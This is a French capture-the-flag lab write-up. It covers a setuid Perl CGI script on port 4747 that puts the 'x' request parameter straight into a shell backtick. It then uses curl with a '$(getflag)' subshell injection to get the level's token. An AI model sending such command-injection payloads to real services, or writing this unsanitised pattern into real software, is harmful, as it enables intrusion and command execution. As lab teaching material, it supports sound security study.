# Level04

Premiere étape de recherche

	$ ls -la
	-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

On trouve un script perl avec setuid et setgid


```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Un script perl qui utilise CGI, donc servi par un serveur web, sur le port 4747 comme indiqué en commentaire

Testons avec curl

	$ curl -I localhost:4747
	HTTP/1.1 200 OK
	Date: Thu, 28 Nov 2019 11:04:23 GMT
	Server: Apache/2.2.22 (Ubuntu)
	Vary: Accept-Encoding
	Content-Length: 1
	Content-Type: text/html

Version commentée du script

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
# fonction qui affiche son argument via echo
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
# l'argument de la fonction x est le parametre nomme "x"
x(param("x"));
```

Le script affiche la valeur du parametre "x" de la requete

	$ curl 192.168.1.27:4747?x=coucou
	coucou

On peut injecter un subshell pour que echo affiche son resultat

	$ curl '192.168.1.27:4747?x=$(getflag)'
	Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXX
